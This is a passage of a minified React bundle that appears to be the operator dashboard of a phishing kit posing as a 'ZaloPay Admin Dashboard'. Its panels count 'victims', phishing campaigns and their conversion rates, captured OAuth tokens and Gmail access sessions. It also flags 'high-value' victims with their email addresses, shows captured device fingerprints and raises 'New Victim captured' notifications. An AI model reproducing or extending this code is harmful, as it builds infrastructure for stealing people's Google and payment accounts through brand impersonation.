Date().toISOString()})),G={total_registrations:u.statistics.totalVictims,total_victims:u.statistics.totalVictims,total_campaigns:u.statistics.totalCampaigns,active_campaigns:u.statistics.totalCampaigns,recent_victims:u.statistics.recentVictims,total_oauth_tokens:u.statistics.totalOAuthTokens,total_gmail_access:u.statistics.totalGmailAccess,registration_completed:u.statistics.registrationCompleted,registration_rate:parseFloat(u.statistics.registrationRate),pending_registrations:D.registrationStats.pending,under_review_registrations:0,approved_registrations:u.statistics.registrationCompleted,rejected_registrations:0,total_transactions:0,total_volume:0,active_users:0,total_verifications:0,pending_verifications:0,completed_transactions:0,new_registrations_this_week:0,new_registrations_this_month:0,high_value_victims:0,oauth_captures:u.statistics.totalOAuthTokens,system_health:{database:z.database||"healthy",api:"healthy",websocket:"healthy",background_jobs:"healthy"},high_value_alerts:[],campaign_performance:u.campaignPerformance.map(W=>({campaign_id:W.id,campaign_name:W.name,total_victims:W.totalVictims,conversion_rate:W.registrationCompleted,high_value_count:0})),victim_analytics:{by_capture_method:D.byCaptureMethod,by_market_value:{},by_campaign:{},daily_captures:[]}};s(G),r([]);const j=["#0ea5e9","#10b981","#f59e0b","#6366f1","#ef4444","#14b8a6"];c({registrations_by_status:[{name:"Pending",value:G.pending_registrations,color:"#fbbf24"},{name:"Approved",value:G.approved_registrations,color:"#10b981"}],capture_by_method:Object.entries(D.byCaptureMethod||{}).map(([W,U],J)=>({method:W,count:U,color:j[J%j.length]}))})}catch(u){f(u instanceof Error?u.message:"Unknown error")}finally{l(!1),o(!1)}};d.useEffect(()=>{m();const u=setInterval(m,3e4);return()=>clearInterval(u)},[]);const B=async()=>{o(!0),await m()},P=u=>new Date(u).toLocaleString("vi-VN"),S=u=>{const D=new Date(u),G=Math.floor((new Date().getTime()-D.getTime())/1e3);return G<60?"Vừa xong":G<3600?`${Math.floor(G/60)} phút trước`:G<86400?`${Math.floor(G/3600)} giờ trước`:`${Math.floor(G/86400)} ngày trước`};return x?e.jsx("div",{className:"flex items-center justify-center h-64",children:e.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"})}):y?e.jsx("div",{className:"p-6",children:e.jsxs("div",{className:"bg-red-50 border border-red-200 rounded-lg p-4",children:[e.jsxs("p",{className:"text-red-600",children:["Error loading dashboard: ",y]}),e.jsx(C,{onClick:B,className:"mt-2",children:"Try Again"})]})}):e.jsxs("div",{className:"p-6 space-y-6",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-gray-900",children:"ZaloPay Admin Dashboard"}),e.jsx("p",{className:"text-gray-600",children:"Tổng quan hệ thống quản lý đối tác"})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"flex items-center gap-2 text-sm text-gray-600",children:h?e.jsxs(e.Fragment,{children:[e.jsx(is,{className:"h-4 w-4 text-green-500"}),e.jsx("span",{children:"Đang kết nối real-time"})]}):e.jsxs(e.Fragment,{children:[e.jsx(rs,{className:"h-4 w-4 text-gray-400"}),e.jsx("span",{children:"Không kết nối real-time"})]})}),e.jsxs(C,{variant:"outline",onClick:B,disabled:b,className:"flex items-center gap-2",children:[e.jsx(Ce,{className:`h-4 w-4 ${b?"animate-spin":""}`}),b?"Đang tải...":"Làm mới"]}),e.jsxs(C,{className:"flex items-center gap-2",children:[e.jsx(Ee,{className:"h-4 w-4"}),"Xuất báo cáo"]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6",children:[e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Tổng nạn nhân"}),e.jsx(Ve,{className:"h-4 w-4 text-muted-foreground"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:t==null?void 0:t.total_registrations.toLocaleString()}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:["Trong 24h: ",t==null?void 0:t.recent_victims]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Hoàn tất đăng ký"}),e.jsx(ge,{className:"h-4 w-4 text-green-500"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold text-green-600",children:(O=t==null?void 0:t.approved_registrations)==null?void 0:O.toLocaleString()}),e.jsxs("p",{className:"text-xs text-muted-foreground",children:["Tỉ lệ: ",t==null?void 0:t.registration_rate,"%"]})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"OAuth Tokens"}),e.jsx(Ce,{className:"h-4 w-4 text-blue-500"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:(V=t==null?void 0:t.total_oauth_tokens)==null?void 0:V.toLocaleString()}),e.jsx("p",{className:"text-xs text-muted-foreground",children:"Tokens đang hoạt động"})]})]}),e.jsxs(k,{children:[e.jsxs(L,{className:"flex flex-row items-center justify-between space-y-0 pb-2",children:[e.jsx(M,{className:"text-sm font-medium",children:"Gmail Access"}),e.jsx(Ke,{className:"h-4 w-4 text-purple-500"})]}),e.jsxs(_,{children:[e.jsx("div",{className:"text-2xl font-bold",children:(v=t==null?void 0:t.total_gmail_access)==null?void 0:v.toLocaleString()}),e.jsx("p",{className:"text-xs text-muted-foreground",children:"Phiên đã hoàn tất"})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-6",children:[e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(ya,{className:"h-5 w-5"}),"Trạng thái đăng ký"]})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-4",children:i==null?void 0:i.registrations_by_status.map(u=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"w-3 h-3 rounded-full",style:{backgroundColor:u.color}}),e.jsx("span",{className:"text-sm font-medium",children:u.name})]}),e.jsx($,{variant:"secondary",children:u.value})]},u.name))})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(We,{className:"h-5 w-5"}),"Phân bố theo phương thức capture"]})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:i==null?void 0:i.capture_by_method.map(u=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"w-3 h-3 rounded-full",style:{backgroundColor:u.color}}),e.jsx("span",{className:"text-sm font-medium",children:u.method})]}),e.jsx($,{variant:"secondary",children:u.count})]},u.method))})})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsxs(k,{className:"lg:col-span-2",children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(Ce,{className:"h-5 w-5"}),"Hoạt động gần đây"]})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-4",children:a.length>0?a.slice(0,8).map(u=>e.jsxs("div",{className:"flex items-start gap-3 pb-3 border-b border-gray-100 last:border-0",children:[e.jsx("div",{className:"w-2 h-2 bg-blue-500 rounded-full mt-2 flex-shrink-0"}),e.jsxs("div",{className:"flex-1 min-w-0",children:[e.jsx("p",{className:"text-sm font-medium text-gray-900",children:u.action}),e.jsx("p",{className:"text-sm text-gray-600 mt-1",children:u.details}),e.jsx("p",{className:"text-xs text-gray-400 mt-1",children:P(u.created_at)})]})]},u.id)):e.jsx("p",{className:"text-gray-500 text-center py-4",children:"Chưa có hoạt động nào"})})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"flex items-center gap-2",children:[e.jsx(Te,{className:"h-5 w-5"}),"Thao tác nhanh"]})}),e.jsx(_,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs(C,{variant:"outline",className:"w-full justify-start",onClick:()=>window.location.href="/admin#/registrations?status=pending",children:[e.jsx(ge,{className:"h-4 w-4 mr-2"}),"Đăng ký hoàn tất (",t==null?void 0:t.approved_registrations,")"]}),e.jsxs(C,{variant:"outline",className:"w-full justify-start",onClick:()=>window.location.href="/admin#/verifications?status=pending",children:[e.jsx(Ve,{className:"h-4 w-4 mr-2"}),"Xem chiến dịch (",t==null?void 0:t.total_campaigns,")"]}),e.jsxs(C,{variant:"outline",className:"w-full justify-start",onClick:()=>window.location.href="/admin#/transactions",children:[e.jsx(Ce,{className:"h-4 w-4 mr-2"}),"OAuth tokens (",t==null?void 0:t.total_oauth_tokens,")"]}),e.jsxs(C,{variant:"outline",className:"w-full justify-start",onClick:()=>window.location.href="/admin#/settings",children:[e.jsx(We,{className:"h-4 w-4 mr-2"}),"Phân tích nạn nhân"]})]})})]})]}),(t==null?void 0:t.campaign_performance)&&t.campaign_performance.length>0&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(Nt,{className:"h-5 w-5"}),"Campaign Performance"]})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-4",children:t.campaign_performance.map(u=>e.jsxs("div",{className:"p-4 bg-gray-50 rounded-lg",children:[e.jsxs("div",{className:"flex items-center justify-between mb-2",children:[e.jsx("h3",{className:"font-medium text-gray-900",children:u.campaign_name}),e.jsxs($,{variant:"outline",children:[u.total_victims," victims"]})]}),e.jsxs("div",{className:"grid grid-cols-3 gap-4 mt-3",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm text-gray-600",children:"Conversion Rate"}),e.jsxs("p",{className:"text-lg font-bold text-blue-600",children:[u.conversion_rate,"%"]})]}),e.jsxs("div",{children:[e.jsx("p",{className:"text-sm text-gray-600",children:"High Value"}),e.jsx("p",{className:"text-lg font-bold text-purple-600",children:u.high_value_count})]}),e.jsxs("div",{children:[e.jsx("p",{className:"text-sm text-gray-600",children:"Total Victims"}),e.jsx("p",{className:"text-lg font-bold text-gray-900",children:u.total_victims})]})]})]},u.campaign_id))})})]}),(t==null?void 0:t.victim_analytics)&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(Ve,{className:"h-5 w-5"}),"Victim Analytics"]})}),e.jsx(_,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-6",children:[e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600 mb-3",children:"By Capture Method"}),e.jsx("div",{className:"space-y-2",children:Object.entries(t.victim_analytics.by_capture_method).map(([u,D])=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-700",children:u}),e.jsx($,{variant:"outline",children:D})]},u))})]}),e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600 mb-3",children:"By Market Value"}),e.jsx("div",{className:"space-y-2",children:Object.entries(t.victim_analytics.by_market_value).map(([u,D])=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-700",children:u}),e.jsx($,{variant:"outline",children:D})]},u))})]}),e.jsxs("div",{children:[e.jsx("p",{className:"text-sm font-medium text-gray-600 mb-3",children:"Daily Captures (Last 7 days)"}),e.jsx("div",{className:"space-y-2",children:t.victim_analytics.daily_captures.slice(-7).map(u=>e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsx("span",{className:"text-sm text-gray-700",children:new Date(u.date).toLocaleDateString("vi-VN")}),e.jsx($,{variant:"outline",children:u.count})]},u.date))})]})]})})]}),(p.length>0||((I=t==null?void 0:t.high_value_alerts)==null?void 0:I.length))&&e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(tn,{className:"h-5 w-5 text-yellow-500"}),"High-Value Alerts"]})}),e.jsx(_,{children:e.jsx("div",{className:"space-y-3",children:(p.length>0?p:(t==null?void 0:t.high_value_alerts)||[]).slice(0,5).map(u=>e.jsx("div",{className:"p-3 bg-yellow-50 border border-yellow-200 rounded-lg",children:e.jsxs("div",{className:"flex items-start justify-between",children:[e.jsxs("div",{className:"flex-1",children:[e.jsx("p",{className:"font-medium text-gray-900",children:u.message}),e.jsx("p",{className:"text-sm text-gray-600 mt-1",children:u.victim_email}),e.jsx("p",{className:"text-xs text-gray-500 mt-1",children:S(u.timestamp)})]}),e.jsx($,{className:u.type==="new_high_value"?"bg-purple-100 text-purple-800":u.type==="oauth_captured"?"bg-green-100 text-green-800":"bg-blue-100 text-blue-800",children:u.type})]})},u.id))})})]}),e.jsxs(k,{children:[e.jsx(L,{children:e.jsxs(M,{className:"text-lg flex items-center gap-2",children:[e.jsx(wa,{className:"h-5 w-5"}),"System Health"]})}),e.jsx(_,{children:e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-4 gap-6",children:t!=null&&t.system_health?e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"flex items-center gap-3",children:[t.system_health.database==="healthy"?e.jsx(ge,{className:"h-5 w-5 text-green-500"}):t.system_health.database==="warning"?e.jsx(Le,{className:"h-5 w-5 text-yellow-500"}):e.jsx(Ne,{className:"h-5 w-5 text-red-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"Database"}),e.jsx("p",{className:"text-sm text-gray-600",children:t.system_health.database==="healthy"?"Healthy":t.system_health.database==="warning"?"Warning":"Error"})]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[t.system_health.api==="healthy"?e.jsx(ge,{className:"h-5 w-5 text-green-500"}):t.system_health.api==="warning"?e.jsx(Le,{className:"h-5 w-5 text-yellow-500"}):e.jsx(Ne,{className:"h-5 w-5 text-red-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"API Services"}),e.jsx("p",{className:"text-sm text-gray-600",children:t.system_health.api==="healthy"?"Healthy":t.system_health.api==="warning"?"Warning":"Error"})]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[t.system_health.websocket==="healthy"?e.jsx(ge,{className:"h-5 w-5 text-green-500"}):t.system_health.websocket==="warning"?e.jsx(Le,{className:"h-5 w-5 text-yellow-500"}):e.jsx(Ne,{className:"h-5 w-5 text-red-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"WebSocket"}),e.jsx("p",{className:"text-sm text-gray-600",children:t.system_health.websocket==="healthy"?"Healthy":t.system_health.websocket==="warning"?"Warning":"Error"})]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[t.system_health.background_jobs==="healthy"?e.jsx(ge,{className:"h-5 w-5 text-green-500"}):t.system_health.background_jobs==="warning"?e.jsx(Le,{className:"h-5 w-5 text-yellow-500"}):e.jsx(Ne,{className:"h-5 w-5 text-red-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"Background Jobs"}),e.jsx("p",{className:"text-sm text-gray-600",children:t.system_health.background_jobs==="healthy"?"Healthy":t.system_health.background_jobs==="warning"?"Warning":"Error"})]})]})]}):e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx(ge,{className:"h-5 w-5 text-green-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"Database"}),e.jsx("p",{className:"text-sm text-gray-600",children:"Hoạt động bình thường"})]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx(ge,{className:"h-5 w-5 text-green-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"API Services"}),e.jsx("p",{className:"text-sm text-gray-600",children:"Hoạt động bình thường"})]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[h?e.jsx(ge,{className:"h-5 w-5 text-green-500"}):e.jsx(Le,{className:"h-5 w-5 text-yellow-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"WebSocket"}),e.jsx("p",{className:"text-sm text-gray-600",children:h?"Connected":"Disconnected"})]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx(Le,{className:"h-5 w-5 text-yellow-500"}),e.jsxs("div",{children:[e.jsx("p",{className:"font-medium",children:"Background Jobs"}),e.jsx("p",{className:"text-sm text-gray-600",children:"Một vài task đang chờ"})]})]})]})})})]})]})}const Yt=d.forwardRef(({className:n,checked:t,onCheckedChange:s,...a},r)=>{const i=c=>{s&&s(c.target.checked)};return e.jsx("input",{type:"checkbox",ref:r,checked:t,onChange:i,className:Z("h-4 w-4 rounded border-gray-300 text-blue-600 focus:ring-blue-500",n),...a})});Yt.displayName="Checkbox";const Me=d.forwardRef(({className:n,...t},s)=>e.jsx("div",{className:"relative w-full overflow-auto",children:e.jsx("table",{ref:s,className:Z("w-full caption-bottom text-sm",n),...t})}));Me.displayName="Table";const Pe=d.forwardRef(({className:n,...t},s)=>e.jsx("thead",{ref:s,className:Z("[&_tr]:border-b",n),...t}));Pe.displayName="TableHeader";const De=d.forwardRef(({className:n,...t},s)=>e.jsx("tbody",{ref:s,className:Z("[&_tr:last-child]:border-0",n),...t}));De.displayName="TableBody";const xi=d.forwardRef(({className:n,...t},s)=>e.jsx("tfoot",{ref:s,className:Z("bg-primary font-medium text-primary-foreground",n),...t}));xi.displayName="TableFooter";const he=d.forwardRef(({className:n,...t},s)=>e.jsx("tr",{ref:s,className:Z("border-b transition-colors hover:bg-muted/50 data-[state=selected]:bg-muted",n),...t}));he.displayName="TableRow";const K=d.forwardRef(({className:n,...t},s)=>e.jsx("th",{ref:s,className:Z("h-12 px-4 text-left align-middle font-medium text-muted-foreground [&:has([role=checkbox])]:pr-0",n),...t}));K.displayName="TableHead";const H=d.forwardRef(({className:n,...t},s)=>e.jsx("td",{ref:s,className:Z("p-4 align-middle [&:has([role=checkbox])]:pr-0",n),...t}));H.displayName="TableCell";const ui=d.forwardRef(({className:n,...t},s)=>e.jsx("caption",{ref:s,className:Z("mt-4 text-sm text-muted-foreground",n),...t}));ui.displayName="TableCaption";const ce=Wn,le=Jn,re=d.forwardRef(({className:n,children:t,...s},a)=>e.jsxs(Hs,{ref:a,className:Z("flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 [&>span]:line-clamp-1",n),...s,children:[t,e.jsx($n,{asChild:!0,children:e.jsx(ss,{className:"h-4 w-4 opacity-50"})})]}));re.displayName=Hs.displayName;const Pn=d.forwardRef(({className:n,...t},s)=>e.jsx(Ks,{ref:s,className:Z("flex cursor-default items-center justify-center py-1",n),...t,children:e.jsx(da,{className:"h-4 w-4"})}));Pn.displayName=Ks.displayName;const Dn=d.forwardRef(({className:n,...t},s)=>e.jsx(Gs,{ref:s,className:Z("flex cursor-default items-center justify-center py-1",n),...t,children:e.jsx(ss,{className:"h-4 w-4"})}));Dn.displayName=Gs.displayName;const ie=d.forwardRef(({className:n,children:t,position:s="popper",...a},r)=>e.jsx(Hn,{children:e.jsxs(Qs,{ref:r,className:Z("relative z-50 max-h-96 min-w-[8rem] overflow-hidden rounded-md border bg-popover text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2",s==="popper"&&"data-[side=bottom]:translate-y-1 data-[side=left]:-translate-x-1 data-[side=right]:translate-x-1 data-[side=top]:-translate-y-1",n),position:s,...a,children:[e.jsx(Pn,{}),e.jsx(Kn,{className:Z("p-1",s==="popper"&&"h-[var(--radix-select-trigger-height)] w-full min-w-[var(--radix-select-trigger-width)]"),children:t}),e.jsx(Dn,{})]})}));ie.displayName=Qs.displayName;const pi=d.forwardRef(({className:n,...t},s)=>e.jsx(Ws,{ref:s,className:Z("py-1.5 pl-8 pr-2 text-sm font-semibold",n),...t}));pi.displayName=Ws.displayName;const R=d.forwardRef(({className:n,children:t,...s},a)=>e.jsxs(Js,{ref:a,className:Z("relative flex w-full cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50",n),...s,children:[e.jsx("span",{className:"absolute left-2 flex h-3.5 w-3.5 items-center justify-center",children:e.jsx(Gn,{children:e.jsx(oa,{className:"h-4 w-4"})})}),e.jsx(Qn,{children:t})]}));R.displayName=Js.displayName;const gi=d.forwardRef(({className:n,...t},s)=>e.jsx(Xs,{ref:s,className:Z("-mx-1 my-1 h-px bg-muted",n),...t}));gi.displayName=Xs.displayName;function fi({fingerprint:n,className:t}){if(!n)return e.jsxs(k,{className:t,children:[e.jsx(L,{children:e.jsx(M,{className:"text-sm",children:"Device Fingerprint"})}),e.jsx(_,{children:e.jsx("p",{className:"text-sm text-gray-500",children:"No fingerprint data available"})})]});const s=n.is_valid!==!1&&(n.validation_score===void 0||n.validation_score>=70);return e.jsxs(k,{className:t,children:[e.jsx(L,{children:e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs(M,{className:"text-sm flex items-center gap-2",children:[e.jsx(bt,{className:"h-4 w-4"}),"Device Fingerprint"]}),n.validation_score!==void 0&&e.jsxs($,{variant:s?"default":"destructive",children:["Score: ",n.validation_score,"/100"]})]})}),e.jsxs(_,{className:"space-y-4",children:[n.validation_score!==void 0&&e.jsxs("div",{className:"flex items-center gap-2 pb-3 border-b",children:[s?e.jsx(wt,{className:"h-4 w-4 text-green-500"}):e.jsx(Ne,{className:"h-4 w-4 text-red-500"}),e.jsx("span",{className:"text-sm font-medium",children:s?"Valid Fingerprint":"Invalid or Suspicious Fingerprint"})]}),n.anomalies&&n.anomalies.length>0&&e.jsxs("div",{className:"bg-yellow-50 border border-yellow-200 rounded-lg p-3",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[e.jsx(Le,{className:"h-4 w-4 text-yellow-600"}),e.jsx("span",{className:"text-sm font-medium text-yellow-900",children:"Anomalies Detected"})]}),e.jsx("ul",{className:"list-disc list-inside text-xs text-yellow-800 space-y-1",children:n.anomalies.map((a,r)=>e.jsx("li",{children:a.replace(/_/g," ")},r))})]}),e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(bt,{className:"h-3 w-3"}),"Screen & Display"]}),e.jsxs("div",{className:"grid grid-cols-2 gap-2 text-xs",children:[n.screen_resolution&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Resolution:"}),e.jsx("span",{className:"ml-1 font-mono",children:n.screen_resolution})]}),n.color_depth&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Color Depth:"}),e.jsxs("span",{className:"ml-1 font-mono",children:[n.color_depth," bit"]})]}),n.pixel_ratio&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Pixel Ratio:"}),e.jsxs("span",{className:"ml-1 font-mono",children:[n.pixel_ratio,"x"]})]})]})]}),e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(zt,{className:"h-3 w-3"}),"Location & Language"]}),e.jsxs("div",{className:"grid grid-cols-2 gap-2 text-xs",children:[n.timezone&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Timezone:"}),e.jsx("span",{className:"ml-1 font-mono",children:n.timezone})]}),n.language&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Language:"}),e.jsx("span",{className:"ml-1",children:n.language})]}),n.languages&&n.languages.length>0&&e.jsxs("div",{className:"col-span-2",children:[e.jsx("span",{className:"text-gray-600",children:"Languages:"}),e.jsx("div",{className:"flex flex-wrap gap-1 mt-1",children:n.languages.map((a,r)=>e.jsx($,{variant:"outline",className:"text-xs",children:a},r))})]})]})]}),e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(zt,{className:"h-3 w-3"}),"Platform & Browser"]}),e.jsxs("div",{className:"space-y-1 text-xs",children:[n.platform&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Platform:"}),e.jsx("span",{className:"ml-1",children:n.platform})]}),n.user_agent&&e.jsxs("div",{className:"mt-2",children:[e.jsx("span",{className:"text-gray-600",children:"User Agent:"}),e.jsx("div",{className:"mt-1 p-2 bg-gray-50 rounded font-mono text-xs break-all",children:n.user_agent})]})]})]}),(n.hardware_concurrency||n.device_memory)&&e.jsxs("div",{children:[e.jsx("h4",{className:"text-xs font-semibold text-gray-700 mb-2",children:"Hardware"}),e.jsxs("div",{className:"grid grid-cols-2 gap-2 text-xs",children:[n.hardware_concurrency&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"CPU Cores:"}),e.jsx("span",{className:"ml-1 font-mono",children:n.hardware_concurrency})]}),n.device_memory&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Memory:"}),e.jsxs("span",{className:"ml-1 font-mono",children:[n.device_memory," GB"]})]})]})]}),n.canvas_signature&&e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(ks,{className:"h-3 w-3"}),"Canvas Fingerprint"]}),e.jsxs("div",{className:"p-2 bg-gray-50 rounded font-mono text-xs break-all",children:[n.canvas_signature.substring(0,100),"..."]})]}),(n.webgl_vendor||n.webgl_renderer)&&e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(ks,{className:"h-3 w-3"}),"WebGL"]}),e.jsxs("div",{className:"space-y-1 text-xs",children:[n.webgl_vendor&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Vendor:"}),e.jsx("span",{className:"ml-1 font-mono",children:n.webgl_vendor})]}),n.webgl_renderer&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Renderer:"}),e.jsx("span",{className:"ml-1 font-mono",children:n.webgl_renderer})]}),n.webgl_version&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Version:"}),e.jsx("span",{className:"ml-1 font-mono",children:n.webgl_version})]})]})]}),n.audio_fingerprint&&e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(ha,{className:"h-3 w-3"}),"Audio Fingerprint"]}),e.jsx("div",{className:"p-2 bg-gray-50 rounded font-mono text-xs break-all",children:n.audio_fingerprint})]}),n.plugins&&n.plugins.length>0&&e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(va,{className:"h-3 w-3"}),"Plugins (",n.plugins.length,")"]}),e.jsxs("div",{className:"flex flex-wrap gap-1",children:[n.plugins.slice(0,5).map((a,r)=>e.jsx($,{variant:"outline",className:"text-xs",children:a},r)),n.plugins.length>5&&e.jsxs($,{variant:"outline",className:"text-xs",children:["+",n.plugins.length-5," more"]})]})]}),n.fonts&&n.fonts.length>0&&e.jsxs("div",{children:[e.jsxs("h4",{className:"text-xs font-semibold text-gray-700 mb-2 flex items-center gap-2",children:[e.jsx(ka,{className:"h-3 w-3"}),"Fonts (",n.fonts.length,")"]}),e.jsxs("div",{className:"flex flex-wrap gap-1",children:[n.fonts.slice(0,10).map((a,r)=>e.jsx($,{variant:"outline",className:"text-xs",children:a},r)),n.fonts.length>10&&e.jsxs($,{variant:"outline",className:"text-xs",children:["+",n.fonts.length-10," more"]})]})]}),e.jsxs("div",{children:[e.jsx("h4",{className:"text-xs font-semibold text-gray-700 mb-2",children:"Other Properties"}),e.jsxs("div",{className:"grid grid-cols-2 gap-2 text-xs",children:[n.cookie_enabled!==void 0&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Cookies:"}),e.jsx("span",{className:"ml-1",children:n.cookie_enabled?"Enabled":"Disabled"})]}),n.do_not_track&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Do Not Track:"}),e.jsx("span",{className:"ml-1",children:n.do_not_track})]}),n.max_touch_points!==void 0&&e.jsxs("div",{children:[e.jsx("span",{className:"text-gray-600",children:"Touch Points:"}),e.jsx("span",{className:"ml-1",children:n.max_touch_points})]})]})]}),n.fingerprint_id&&e.jsx("div",{className:"pt-2 border-t",children:e.jsxs("div",{className:"text-xs",children:[e.jsx("span",{className:"text-gray-600",children:"Fingerprint ID:"}),e.jsx("div",{className:"mt-1 p-2 bg-gray-50 rounded font-mono break-all",children:n.fingerprint_id})]})}),n.fingerprint_timestamp&&e.jsxs("div",{className:"text-xs text-gray-500",children:["Captured: ",new Date(n.fingerprint_timestamp).toLocaleString()]})]})]})}function Ds(){var U,J,q;const{toast:n}=Se(),t=qe(),[s,a]=d.useState(""),[r,i]=d.useState({page:1,per_page:20,status:""}),[c,x]=d.useState(null),[l,y]=d.useState(new Set),[f,b]=d.useState(!1);Ge({type:"victims",enabled:!0,onMessage:T=>{(T.type==="victim:captured"||T.type==="victim:registered")&&(t.invalidateQueries({queryKey:["victims"]}),t.invalidateQueries({queryKey:["dashboard-stats"]}),n({title:"New Victim",description:T.data.email||"New victim captured"}))}});const{data:o,isLoading:p,refetch:g}=me({queryKey:["victims",r,s],queryFn:()=>{const T=new URLSearchParams;return 